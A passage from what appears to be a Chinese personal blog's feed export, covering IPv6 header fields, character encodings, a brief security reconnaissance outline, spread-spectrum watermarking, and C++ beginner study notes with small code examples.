Point）字段，DSCP字段，利用前六个比特标识服务优先级等。</p><ul><li>具体参考RFC文档</li><li>另外一个点，这个字段是不受信任的，因为用户都可以自己修改这个值，如果改为高优先级相当于白嫖了运营商的服务。所以正确的方案应该是在路由器的位置重新设置这个值，但是要防止用户端接近这个路由器，因为用户同样可以修改路由器配置来修改这个值，所以在运营商管理的路由器修改这个值才有意义。</li></ul><p>显示拥塞通知（Explicit Congestion Notification）字段，也就是ECN字段，这在IPv4协议中也是存在的。</p><ul><li>00： 数据包未使用ECN</li><li>01&#x2F;10： 发送端和接收端开启了ECN功能</li><li>11： 路由器发出拥塞指示</li></ul><h3 id="2-5-流标签（Flow-Label）"><a href="#2-5-流标签（Flow-Label）" class="headerlink" title="2.5 流标签（Flow Label）"></a>2.5 流标签（Flow Label）</h3><p>20个比特。<br>对于不支持流标签字段功能的主机和路由器来说（目前的大多数应用都不需要修改以使用流标签，或者根本就不需要QoS处理），在发送数据包时需要将该字段设置为全0，在转发数据包时需要保持该字段不变，在收到数据包后直接忽略该字段的内容。</p><p>需要注意的是，流标签和通信类别字段保留了一些未定义比特，如果路由器不对此置为零，那么可以利用这个字段传输秘密信息，这是一个信息隐藏的方法。</p><h3 id="2-6-载荷长度"><a href="#2-6-载荷长度" class="headerlink" title="2.6 载荷长度"></a>2.6 载荷长度</h3><p>16个比特，载荷长度去除IPv6首部的长度，包括扩展头和载荷（传输层或者ICMP包）的长度。</p><p>IPv4中有一个字段是数据报长度，表示数据报的总长度。相比于IPv6，它计入了首部的长度。</p><p>这个字段单位为字节byte，可以标识0-65535字节的范围，MTU只有1500字节，减去IPv6报头只有1460字节。因此这个字段的长度也是足够的。</p><h3 id="2-7-下一个首部"><a href="#2-7-下一个首部" class="headerlink" title="2.7 下一个首部"></a>2.7 下一个首部</h3><p>8个比特，用于指示下一个首部的类型。</p><p>这个字段的设置和IPv4的上层协议字段相同，共用一个标准，比如值6标识TCP，值17标识UDP。当然也可以标识一些网络层协议比如ICMP协议，或者标识认证或者加密的协议AH，ESP，又或者是分片头（IPv6将分片的工作交给终端而不是路由器，并且使用协议约定线路的MTU，相比于IPv4将分片交给路由器，这简化了路由器的操作加快了转发速度）。</p><p><a href="https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml">具体参考IANA的Protocol Numbers</a></p><p>这个字段的长度也是足够的，目前只用了一半多一点。</p><h3 id="2-8-跳限制（Hop-limit）"><a href="#2-8-跳限制（Hop-limit）" class="headerlink" title="2.8 跳限制（Hop limit）"></a>2.8 跳限制（Hop limit）</h3><p>8个比特，表示网络层报文在路由器之间的传输次数限制，每到达一次路由器，这个数字减少一，减到零路由器将丢弃这个包。这样避免一个数据包在路由器之间无限循环，浪费资源。</p><p>这和IPv4中的的TTL字段一样，只不过换了一个更贴切的名字，因为TTL的意思是生存时间（Time To Live）。</p><p>这个字段的设置各个设备有些不同，包括Windows，IOS和Linux，它们默认TTL的值各有不同，也许能够这个值来判断设备的操作系统的信息。</p><p>随着IPv6的推进，肯定有越来越多的路由器加入网络，所以TTL的也有变大的可能，当然这个可能需要计算。访问baidu.com消耗了20跳，所以目前这个字段是远远够的。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> internet </tag>
            
            <tag> 因特网 </tag>
            
            <tag> IPv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机编码</title>
      <link href="/posts/computer_encode/"/>
      <url>/posts/computer_encode/</url>
      
        <content type="html"><![CDATA[<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><p>现代计算机使用二进制编码的方式表示事物，在几千年前也有相似的东西：八卦。</p><p>《周易·系辞上》：“易有太极，是生两仪，两仪生四象，四象生八卦”，阴阳变换就像二进制的0、1变换，八卦和二进制有着相同的思想内核。计算机内使用二进制表示字符，八卦则用来表示不同的事物。</p><p>八卦：</p><p><img src="/img/computer_encode/image-1.png" alt="alt text"></p><p>ASCLL码：</p><p><img src="/img/computer_encode/image-2.png" alt="alt text"></p><p>这就是编码，就像一张对应关系的表，将二进制和字符或者其他东西对应起来。</p><h3 id="ASCLL"><a href="#ASCLL" class="headerlink" title="ASCLL"></a>ASCLL</h3><p>ASCII（American Standard Code for Information Interchange），即美国信息交换标准代码。</p><p>ASCLL使用7位二进制编码了26个拉丁字母、符号、数字、控制字符等128个字符。其中ASCLL码前32个字符是控制符，表示开始、换行、回车、结束等。但是ASCLL码在存储时使用8位二进制，最高位用于奇偶校验。</p><p>ASCLL扩展编码在兼容ASCLL码的基础上，使用8位二进制编码了256个字符。</p><p><img src="/img/computer_encode/image-5.png" alt="alt text"></p><h3 id="GB2312"><a href="#GB2312" class="headerlink" title="GB2312"></a>GB2312</h3><p>ASCLL码的局限性在于不是所有国家使用英文字符作为文字，并且无论是7位的ASCLL码还是8位的扩展ASCLL码能表达的字符十分有限。</p><p>因此各个国家都开创了适配自己的编码，GB2312就是其中一个例子。</p><p>GB2312使用两个大于127的字节表示汉字，这样ASCLL码依然占一个字节，汉字占据两个字节。GB2312在编码汉字的同时，既兼容了ASCLL码又在一定程度上节省了空间。</p><p>GB2312虽然包含了大部分中文字符，但是没有编码冷门生僻字和繁体字等等。于是在兼容GB2312的基础上扩展之后的编码方案被称为GBK标准。但是还有少数民族同胞的字符没有考虑在内，这样GBK扩展成为GB18030。这样，适配于中国的字符编码就完善了。</p><h3 id="Unicode-USC"><a href="#Unicode-USC" class="headerlink" title="Unicode&amp;&amp;USC"></a>Unicode&amp;&amp;USC</h3><p>由于几乎每个不兼容ASCLL的国家都创建了一套适配自己的编码，这造成了混乱。计算机想要识别一串文字，必须首先知道它采用的编码，否则你就要尝试所有编码方式，直到得到正确结果。</p><p>ISO（国际标谁化组织）决定解决这个问题。他们采用的方法很简单：弃用所有的地区性编码方案，重新设计一个包括了地球上所有文化的字母和符号的编码：“Universal Multiple-Octet Coded Character Set”，简称 UCS。</p><p>统一码联盟，也开发了Unicode标准（The Unicode Standard），后面双方开始合并工作成果，并为创立一个单一编码表而协同工作。</p><p><img src="/img/computer_encode/image-4.png" alt="alt text"></p><h3 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h3><p>Unicode的实现方式不同于编码方式。一个字符的Unicode编码是确定的。但是在实际传输和存储过程中，由于不同系统平台的设计不一定一致，以及出于节省空间的目的，对Unicode编码的实现方式有所不同。Unicode的实现方式称Unicod转换格式（Unicode Transformation Format，简称为UTF）。其中UTF-8使用最为广泛。</p><p>UTF-8（8-bit Unicode Transformation Format）是一种针对Unicode的可变长度符编码，也是一种前缀码。它可以用一至四个字节对Unicode字符集中的所有有效编码点进行编码。</p><p><img src="/img/computer_encode/image-3.png" alt="alt text"></p><p>当文件受损，后续的字节都是以10开头，这样即使从某个中间字节开始读，计算机也能跳过。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/posts/security_information/"/>
      <url>/posts/security_information/</url>
      
        <content type="html"><![CDATA[<p><em>（根root证书认证机构-&gt;中间intermediates证书认证机构-&gt;end-user网站证书）root&#x2F;中间：本地电脑中，你有它的公钥，他会用私钥对下发的证书进行数字签名，这样你使用公钥就可以验证证书的真实性。</em></p><p><em>robots.txt规范 user-agent:xxx（允许的爬虫&#x2F;搜索引擎）disallow：目录 或者allow：目录 没有用空格表示，全部用</em>表示）* </p><h2 id="正面信息收集"><a href="#正面信息收集" class="headerlink" title="正面信息收集"></a>正面信息收集</h2><h3 id="门户网站"><a href="#门户网站" class="headerlink" title="门户网站"></a>门户网站</h3><ul><li>证书</li><li>robots.txt</li><li>子域名</li><li>url可能会暴露出编程语言</li><li>ICP备案</li><li>端口</li><li>C段</li></ul><h2 id="侧面信息收集"><a href="#侧面信息收集" class="headerlink" title="侧面信息收集"></a>侧面信息收集</h2>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>扩频水印</title>
      <link href="/posts/steg_spread_spectrum/"/>
      <url>/posts/steg_spread_spectrum/</url>
      
        <content type="html"><![CDATA[<h3 id="扩频技术"><a href="#扩频技术" class="headerlink" title="扩频技术"></a>扩频技术</h3><p>顾名思义扩频技术可以扩充同一频段的通信，代价是更低的信号功率和信息密度，同时有更强的抗干扰能力。</p><ul><li>扩充信道</li><li>更低的信息密度和功率</li><li>更强的抗干扰能力</li></ul><p>对于一段<code>0110</code>的原始信号，使用一段伪随机序列1010和0000分别替换或者异或原始信号的01比特，得到扩频信号。</p><p>如何解扩呢？将扩频信号还原回原始信号，如果上诉过程是替换，那么只需要匹配信号中与伪随机序列的相似性确定01；如果是异或过程再次异或随机序列即可。</p><h3 id="扩频和水印"><a href="#扩频和水印" class="headerlink" title="扩频和水印"></a>扩频和水印</h3><p>由于水印对鲁棒性的需求</p>]]></content>
      
      
      <categories>
          
          <category> 信息隐藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
            <tag> 扩频水印 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPP</title>
      <link href="/posts/cpp/"/>
      <url>/posts/cpp/</url>
      
        <content type="html"><![CDATA[<p><em>2024-1-26开始学习cpp…</em></p><h1 id="1-26"><a href="#1-26" class="headerlink" title="1-26"></a>1-26</h1><p><em>参考视频：<a href="https://www.bilibili.com/video/BV1VJ411M7WR">最好的C++教程</a></em></p><h1 id="P1-Welcome-to-CPP"><a href="#P1-Welcome-to-CPP" class="headerlink" title="P1: Welcome to CPP"></a>P1: Welcome to CPP</h1><p>CPP</p><ul><li>编译型语言</li><li>更高的效率</li><li>对硬件的直接控制</li><li>跨平台</li></ul><h1 id="P2-How-to-Setup-CPP-on-Windows"><a href="#P2-How-to-Setup-CPP-on-Windows" class="headerlink" title="P2: How to Setup CPP on Windows"></a>P2: How to Setup CPP on Windows</h1><h3 id="IDE-Visual-Studio"><a href="#IDE-Visual-Studio" class="headerlink" title="IDE: Visual Studio"></a>IDE: Visual Studio</h3><p>集成开发环境IDE</p><h3 id="Hello-cpp"><a href="#Hello-cpp" class="headerlink" title="Hello cpp"></a>Hello cpp</h3><pre><code class="cpp"># include &lt;iostream&gt;int main()&#123;    std::cout &lt;&lt; &quot;hello cpp&quot; &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><h1 id="P3-How-CPP-Works"><a href="#P3-How-CPP-Works" class="headerlink" title="P3: How CPP Works"></a>P3: How CPP Works</h1><h3 id="include"><a href="#include" class="headerlink" title="#include "></a>#include <iostream></h3><p>任何以“#”开头的都是预处理指令。</p><p>include指的是包含一个文件<br>另外std表示标准</p><p>std::cout &lt;&lt; &lt;&lt; std::endl输出到控制台，endl表示换行</p><p>&lt;&lt;就像printf一样，std::cout.print().print(std::endl)</p><p>std::cin.get()等待输入回车。</p><p>int main：函数输入输出，输入值和返回值，如果没有指定返回值那么将返回0.</p><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>include <iostream>相当于把文件复制粘贴到代码中。</p><h3 id="可执行程序"><a href="#可执行程序" class="headerlink" title="可执行程序"></a>可执行程序</h3><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><h1 id="P4"><a href="#P4" class="headerlink" title="P4"></a>P4</h1><h1 id="P5"><a href="#P5" class="headerlink" title="P5"></a>P5</h1><h1 id="P8-Variables-in-CPP"><a href="#P8-Variables-in-CPP" class="headerlink" title="P8: Variables in CPP"></a>P8: Variables in CPP</h1><p>程序：数据操作</p><p>数据类型的差距只是大小，另外就是格式化输出的时候会有差距。  </p><h1 id="P9-Functions-in-CPP"><a href="#P9-Functions-in-CPP" class="headerlink" title="P9: Functions in CPP"></a>P9: Functions in CPP</h1><h1 id="P10-CPP-Header-Files"><a href="#P10-CPP-Header-Files" class="headerlink" title="P10: CPP Header Files"></a>P10: CPP Header Files</h1><h1 id="P11-How-to-DEBUG-CPP-in-Visual-Studio"><a href="#P11-How-to-DEBUG-CPP-in-Visual-Studio" class="headerlink" title="P11: How to DEBUG CPP in Visual Studio"></a>P11: How to DEBUG CPP in Visual Studio</h1><h1 id="P12-CONDITIONS-and-BRANCHES-in-CPP"><a href="#P12-CONDITIONS-and-BRANCHES-in-CPP" class="headerlink" title="P12: CONDITIONS and BRANCHES in CPP"></a>P12: CONDITIONS and BRANCHES in CPP</h1><h1 id="P13-BEST-Visual-Studio-Setup-for-CPP-Projects"><a href="#P13-BEST-Visual-Studio-Setup-for-CPP-Projects" class="headerlink" title="P13: BEST Visual Studio Setup for CPP Projects"></a>P13: BEST Visual Studio Setup for CPP Projects</h1><h3 id="filters"><a href="#filters" class="headerlink" title="filters"></a>filters</h3><p>VS的虚拟文件目录</p><h3 id="show-all-files"><a href="#show-all-files" class="headerlink" title="show all files"></a>show all files</h3><p>项目实际文件目录</p><h3 id="setup-projects-structures"><a href="#setup-projects-structures" class="headerlink" title="setup projects structures"></a>setup projects structures</h3><p><img src="/image.png" alt="Alt text"></p><h1 id="P14-Loops-in-CPP"><a href="#P14-Loops-in-CPP" class="headerlink" title="P14: Loops in CPP"></a>P14: Loops in CPP</h1><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>一般使用i表示迭代，i也许代表迭代器iterator</p><pre><code class="CPP">for (int i = 0; i &lt; 5; i++)&#123;    Log(&quot;Hello World!&quot;);&#125;   </code></pre><p>数组遍历</p><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><p>游戏循环</p><h3 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h3><h1 id="P15-Control-Flow-in-CPP"><a href="#P15-Control-Flow-in-CPP" class="headerlink" title="P15: Control Flow in CPP"></a>P15: Control Flow in CPP</h1><h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><p>直接进入下一次循环</p><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>结束循环</p><h3 id="return"><a href="#return" class="headerlink" title="return"></a>return</h3><p>结束函数</p><h1 id="P16-Pointers"><a href="#P16-Pointers" class="headerlink" title="P16: Pointers"></a>P16: Pointers</h1><p>指针只是一个地址，一个整数</p><h3 id="0-NULL-nullptr"><a href="#0-NULL-nullptr" class="headerlink" title="0 NULL nullptr"></a>0 NULL nullptr</h3><h3 id=""><a href="#" class="headerlink" title="* &amp;"></a>* &amp;</h3><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><pre><code class="CPP">int main()&#123;    char* buffer = new char[8];    memset(buffer, 0, 8);    delete[] buffer;    std::cin.get();&#125;</code></pre><h3 id="pointers-to-pointers"><a href="#pointers-to-pointers" class="headerlink" title="pointers to pointers"></a>pointers to pointers</h3><p>指针也是一个变量，它也有内存地址</p><p>指向指针的指针</p><pre><code class="cpp">char** buffer = &amp;buffer;</code></pre><h1 id="P17-References-in-CPP"><a href="#P17-References-in-CPP" class="headerlink" title="P17 References in CPP"></a>P17 References in CPP</h1><p>reference只是指针的扩展，一种语法糖</p><h3 id="传值"><a href="#传值" class="headerlink" title="传值"></a>传值</h3><h3 id="传址"><a href="#传址" class="headerlink" title="传址"></a>传址</h3><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>引用必须初始化，并且没办法更改引用对象</p><p>但是可以用指针实现。。。</p><h1 id="P18-Classes-in-CPP"><a href="#P18-Classes-in-CPP" class="headerlink" title="P18: Classes in CPP"></a>P18: Classes in CPP</h1><h3 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h3><p>C++</p><p>c</p><p>java</p><p>c#</p><p>面向对象</p><p>面向过程</p><h3 id="Classes"><a href="#Classes" class="headerlink" title="Classes"></a>Classes</h3><p>类是一种将数据和函数组织在一起的方式,本质上是一种自制类型。</p><p>想象游戏中的一个玩家角色，需要X和Y的坐标表示位置，可能还需要其他属性比如移动速度，以及可能需要3D模型在屏幕上显示玩家，所有的数据都需要存储到某些地方。</p><pre><code class="cpp">int main()&#123;    int PlayerX, PlayerY;    int PlayerSpeed = 2;    std::cin.get();    return 0;&#125;</code></pre><p>但是需要创建第二个玩家，第三个玩家的时候需要不断地重复这段代码，这样的源代码是难以维护的，因此考虑使用类进行简化。</p><p>就像函数一样，为了简化代码。</p><h3 id="实例化和对象"><a href="#实例化和对象" class="headerlink" title="实例化和对象"></a>实例化和对象</h3><pre><code class="cpp">class Player&#123;    int x, y;    int speed;&#125;;int main()&#123;    Player player;    player.x = 5;&#125;</code></pre><p>编译错误：player中的对象无法访问类中的私有成员。</p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>当创建一个类是，你可以指定类中属性的可见性，默认情况下，类中的所有成员都是私有的。这意味着，类内部的函数才能访问这些变量。</p><p>如果我们需要在main函数中访问类中的变量，需要指定这些变量为公共的public，公有的代表我们可以被允许在类外访问这些变量。</p><pre><code class="cpp">class Player&#123;public:    int x, y;    int speed;&#125;;int main()&#123;    Player player;    player.x = 5;&#125;</code></pre><p>现在可以在外部访问类中的变量了，main函数的变量访问也将成功。</p><h3 id="方法：Method：类的函数"><a href="#方法：Method：类的函数" class="headerlink" title="方法：Method：类的函数"></a>方法：Method：类的函数</h3><pre><code class="cpp">class Player&#123;public:    int x, y;    int speed;  &#125;;    void Move(Player&amp; player, int xa, int ya)    &#123;        player.x += xa * player.speed;        player.y += yx * player.speed;    &#125; int main()&#123;        Player player;    player.x = 5;&#125;</code></pre><p>将上面的函数移动到类中就变成了方法，需要注意的是：当在类中是不再需要传递类中变量的参数而是直接使用。 </p><pre><code class="cpp">class Player&#123;public:    int x, y;    int speed;    void Move(int xa, int ya)    &#123;        x += xa * speed;        y += yx * .speed;    &#125;   &#125;;int main()&#123;        Player player;    player.x = 5;&#125;</code></pre><p>类可以让代码变得更加简洁，当处理大量代码，这将会是一个巨大的优势。</p><p>也许你可以将变量再次改为私有，通过在外部调用函数函数能够访问私有变量吗？</p><h1 id="P19-Classes-vs-Structs-in-CPP"><a href="#P19-Classes-vs-Structs-in-CPP" class="headerlink" title="P19: Classes vs Structs in CPP"></a>P19: Classes vs Structs in CPP</h1><p>类和结构体的区别：非常小的区别，类的变量默认是私有的，结构体则是公有的。</p><p>在CPP中结构体存在的唯一原因是cpp需要维持它和c之间的兼容性，因为C中没有类。</p><p>那C中的结构体和CPP中的结构体的区别？</p><p>C中的结构体可以定义函数吗？可以规定变量的私有或者公有的属性吗？</p><p>如果你需要进行兼容。只需要这样既可以</p><pre><code class="cpp">#define struct class</code></pre><p>什么时候使用类，什么时候使用结构体？</p><p>我想这个问题没有一个确切的答案，因为每个人对于类和结构的定义不同，类是什么，结构体是什么，这是个人的编程风格。</p><p>如果讨论一些plain old data pod的时候，使用struct也许比较好.</p><p>一个很好的例子是数学中的向量类：</p><pre><code class="cpp">struct Vec2&#123;    float x, y;&#125;;</code></pre><p>这并不是说不在结构体中使用方法，它不想player类一样复杂，需要很多操作。Vec只需要简单的对两个数进行操作，没有啥变化。</p><p>继承：继承增加了另外一层复杂性，结构体应该尽量简单。</p><p>另外如果结构体B继承了类A，编译器会发出警告，但是不影响运行。</p><p>也许你可以在变量是公有的时候使用结构，因为这样可以帮助你省略public？</p><p>如果只是代替一个结构中的数据，使用结构体；如果实现有很多功能的类，像游戏世界的玩家，或者其他可以继承的东西，使用类。</p><p>额，很多行内的人这样区分；但是技术上这两者处理可见性以外没有什么区别。</p><h3 id="C中的结构体"><a href="#C中的结构体" class="headerlink" title="C中的结构体"></a>C中的结构体</h3><p>在结构体中使用指向函数的指针，从而实现类似于面向对象编程中的成员函数的功能。这种技术通常被称为函数指针，通过这种方式，你可以将函数与结构体关联起来，实现一些面向对象编程的特性。这在C语言中常用于实现简单的面向对象的思想。</p><pre><code class="cpp">#include &lt;stdio.h&gt;// 定义一个结构体struct Person &#123;    char name[50];    int age;    // 声明一个指向函数的指针    void (*displayInfo)(struct Person*);&#125;;// 定义一个函数，用于显示人员信息void display(struct Person* person) &#123;    printf(&quot;Name: %s, Age: %d\n&quot;, person-&gt;name, person-&gt;age);&#125;int main() &#123;    // 创建一个结构体变量    struct Person person1 = &#123;&quot;Alice&quot;, 25&#125;;    // 将函数指针指向 display 函数    person1.displayInfo = &amp;display;    // 通过函数指针调用 display 函数    person1.displayInfo(&amp;person1);    return 0;&#125;</code></pre><h1 id="P20-How-to-Write-a-CPP-Class"><a href="#P20-How-to-Write-a-CPP-Class" class="headerlink" title="P20: How to Write a CPP Class"></a>P20: How to Write a CPP Class</h1><p>下面将通过一个简单的日志类实现，演示类的基本用法。 </p><h3 id="什么是日志类？"><a href="#什么是日志类？" class="headerlink" title="什么是日志类？"></a>什么是日志类？</h3><p>日志类是管理日志消息的一种方式，将程序的消息打印到控制台&#x2F;不同颜色的控制台&#x2F;输出到文件或者网络。日志消息可以用于调试，在游戏和应用开发中起到帮助。</p><h3 id="实现日志类"><a href="#实现日志类" class="headerlink" title="实现日志类"></a>实现日志类</h3><p>下面实现错误，警告，消息三个级别的日志类。</p><pre><code class="cpp"># include &lt;iostream&gt;class Log&#123;public:    const int LogLevelError = 0;    const int LogLevelWarning = 1;    const int LogLevelInfo = 2;private:    int m_LogLevel = LogLevelInfo;public:    void SetLevel(int level)    &#123;        m_LogLevel = level;    &#125;    void Error(const char* message)    &#123;        if (m_LogLevel &gt;= LogLevelError)            std::cout &lt;&lt; &quot;[Error]: &quot; &lt;&lt; message &lt;&lt; std::endl;    &#125;    void Warn(const char* message)    &#123;        if (m_LogLevel &gt;= LogLevelWarning)            std::cout &lt;&lt; &quot;[Warning]: &quot; &lt;&lt; message &lt;&lt; std::endl;    &#125;    void Info(const char* message)    &#123;        if (m_LogLevel &gt;= LogLevelInfo)            std::cout &lt;&lt; &quot;[Info]: &quot; &lt;&lt; message &lt;&lt; std::endl;    &#125;&#125;;int main()&#123;    Log log;    log.SetLevel(log.LogLevelWarning);    log.Warn(&quot;Hello&quot;);    log.Error(&quot;Hello&quot;);    log.Info(&quot;Hello&quot;);    std::cin.get();&#125;</code></pre><p>这只是一个简单的demo，并不意味着一个Log类需要这么写，会在后面介绍生产级别的代码。</p><h1 id="P21-Static-in-CPP"><a href="#P21-Static-in-CPP" class="headerlink" title="P21: Static in CPP"></a>P21: Static in CPP</h1><p>static分为两种，一种是类外，一种是类中。</p><p>在link阶段是局部的，也就是只对它的编译单元obj起作用</p><p>类中的static变量表示所有类的实例共享，相当于函数多次对一个变量进行操作</p><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><pre><code class="cpp">// Main.cpp#include &lt;iostream&gt;int s_variable = 10;int main()&#123;    std::cout &lt;&lt; s_variable &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><pre><code class="cpp">// Static.cppstatic int s_Variable = 5;</code></pre><p>编译运行之后，结果是main函数输出结果是10，这说明编译单元static.cpp并没有影响到编译单元main.cpp中的变量。</p><p>如果将编译单元Static.cpp中的static去掉，那么链接器将会报错，</p><pre><code class="cpp">// Static.cppint s_Variable = 5;</code></pre><p>外部连接，将static中的变量导入</p><pre><code class="cpp">// Main.cpp#include &lt;iostream&gt;extern int s_Variable;int main()&#123;    std::cout &lt;&lt; s_Variable &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><pre><code class="cpp">// Static.cppint s_Variable = 5;</code></pre><p>额，后面函数也是一样。</p><h3 id="Static-and-Private"><a href="#Static-and-Private" class="headerlink" title="Static and Private"></a>Static and Private</h3><p>全局变量可能会造成奇怪的bug，因为其他编译单元可能总是记挂着它，因此可能需要使用static替代。</p><h3 id="全局变量，静态全局和局部变量"><a href="#全局变量，静态全局和局部变量" class="headerlink" title="全局变量，静态全局和局部变量"></a>全局变量，静态全局和局部变量</h3><p>全局变量：整个程序<br>静态全局变量：文件<br>静态局部变量：文件局部</p><h1 id="P22-Static-for-Classes-and-Structs-in-CPP"><a href="#P22-Static-for-Classes-and-Structs-in-CPP" class="headerlink" title="P22: Static for Classes and Structs in CPP"></a>P22: Static for Classes and Structs in CPP</h1><p>P21讨论了在类外的static关键字的含义，现在将讨论在类中的static的含义。</p><p>在几乎所有面向对象的编程语言中，class内部的static意味着在这个类的所有实例中，只存在一个变量的实例。如果创建一个Entity的类，并不断实例化，然而static的变量只有一个。如果一个实例化对象更改了这个变量，那么所有的实例化对象的这个变量都将会更改，就像全局变量一样。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>如果类中没有static关键字，那么实例化两个对象，两个对象的x，y是不一样的值，一个属于e，一个属于e1.</p><pre><code class="cpp">#include &lt;iostream&gt;struct Entity&#123;    int x, y;        void Print()    &#123;        std::cout &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; std::endl;     &#125;&#125;;int main()&#123;    Entity e;    e.x = 2;    e.y = 3;    Entity e1 = &#123; 5, 8 &#125;;    e.Print();    e1.Print();    std::cin.get();&#125;</code></pre><p>将x和y修改为static变量，实际上这样x，y已经不在属于类成员，因此在注释的地方初始化会报错，换个写法可以。但是严格来说，这样也是不对的。毕竟x，y实际上就是一个全局变量。</p><p>运行程序，结果显示了两次5，8，这意味着实际上两个实例化对象共享同一个x，y。有点像全局变量。</p><pre><code class="cpp">#include &lt;iostream&gt;struct Entity&#123;    static int x, y;        void Print()    &#123;        std::cout &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; std::endl;     &#125;&#125;; int Entity::x;int Entity::y;int main()&#123;    Entity e;    e.x = 2;    e.y = 3;    // Entity e1 = &#123; 5, 8 &#125;;    Entity e1;    e1.x = 5;    e1.y = 8;    e.Print();    e1.Print();    std::cin.get();&#125;</code></pre><p>尽管你可以使用全局变量；或者使用一个静态全局变量，它可以在一个编译单元进行链接，而不会在整个项目中都是全局可见的。也许创建一个静态全局变量和类中的静态变量似乎一样，为什么还要在类内部使用static呢？</p><p>如果你有一些东西，比如一条需要在所有实例中共享的消息，，那么将这条消息放在类内部是有意义的，因为它是和类相关的。</p><h3 id="静态方法无法访问非静态变量"><a href="#静态方法无法访问非静态变量" class="headerlink" title="静态方法无法访问非静态变量"></a>静态方法无法访问非静态变量</h3><p>就像这样，静态方法是无法访问非静态变量的。</p><pre><code class="cpp">#include &lt;iostream&gt;struct Entity&#123;    int x, y;        static void Print()    &#123;        std::cout &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; std::endl;     &#125;&#125;;int main()&#123;    Entity e;    e.x = 2;    e.y = 3;    Entity e1;    e1.x = 5;    e1.y = 8;    Entity::Print();    Entity::Print();    std::cin.get();&#125;</code></pre><p>额，在类中的静态方法属于类本身，而非对象。非静态变量是属于对象的，那么静态变量并不知道调用那么对象的参数。</p><p>在类中实现一个方法，其实就是在类外的一个static方法然后传入对象参数。就像这样子：</p><pre><code class="cpp">#include &lt;iostream&gt;struct Entity&#123;    int x, y;    &#125;;static void Print(Entity e)&#123;    std::cout &lt;&lt; e.x &lt;&lt; &quot;, &quot; &lt;&lt; e.y &lt;&lt; std::endl;&#125;int main()&#123;    Entity e;    e.x = 2;    e.y = 3;    Entity e1;    e1.x = 5;    e1.y = 8;    Print(e);    Print(e1);    std::cin.get();&#125;</code></pre><h1 id="P23-Local-Static-in-CPP"><a href="#P23-Local-Static-in-CPP" class="headerlink" title="P23: Local Static in CPP"></a>P23: Local Static in CPP</h1><p>额，各种地方定义的static变量其实生命周期都是一样的，关键在于它们作用域范围不一样。</p><pre><code class="cpp">#include &lt;iostream&gt;void Function()&#123;    // int i = 0;    static int i = 0;    i++;    std::cout &lt;&lt; i &lt;&lt; std::endl;&#125;int main()&#123;    Function();    Function();    Function();    std::cin.get();&#125;</code></pre><p>如果i不是一个static变量，那么将输出三次“1”，因为每一次进入函数都会初始化一个变量i为0，这样每次程序运行的结果都将一致。那么如果添加static，它就像一个全局变量，只会被初始化一次，并且保持被修改的状态。</p><p>就像这样，只不过它的作用域在函数内，不想全局变量一样可以被随意访问。</p><pre><code class="cpp">#include &lt;iostream&gt;int i;void Function()&#123;    i++;    std::cout &lt;&lt; i &lt;&lt; std::endl;&#125;int main()&#123;    Function();    // 唯一的区别就是你可以在函数以外的地方更改i的值    i++;    Function();    Function();    std::cin.get();&#125;</code></pre><p>local static可以保留全局变量生命周期又可以限制访问范围。</p><h1 id="P24-Enums-in-CPP"><a href="#P24-Enums-in-CPP" class="headerlink" title="P24: Enums in CPP"></a>P24: Enums in CPP</h1><p>枚举</p><pre><code class="cpp">#include &lt;iostream&gt;enum Example : unsigned char&#123;    A = 5, B, C&#125;;int a = 0;int b = 1;int c = 2;int main()&#123;    int Value = B;    if (Value == B)    &#123;        // Do something here     &#125;    std::cin.get();&#125;</code></pre><h1 id="P25-Constructors-in-CPP"><a href="#P25-Constructors-in-CPP" class="headerlink" title="P25: Constructors in CPP"></a>P25: Constructors in CPP</h1><p>构造函数是一种特殊的方法，它会在类每次实例化的时候运行</p><h3 id="举个例子-1"><a href="#举个例子-1" class="headerlink" title="举个例子"></a>举个例子</h3><pre><code class="cpp">#include &lt;iostream&gt;class Entity&#123;public:    float x, y;    void Print()    &#123;    std::cout &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; std::endl;    &#125;&#125;;int main()&#123;    Entity e;    // std::cout &lt;&lt; e.x &lt;&lt; std::endl;    e.Print();    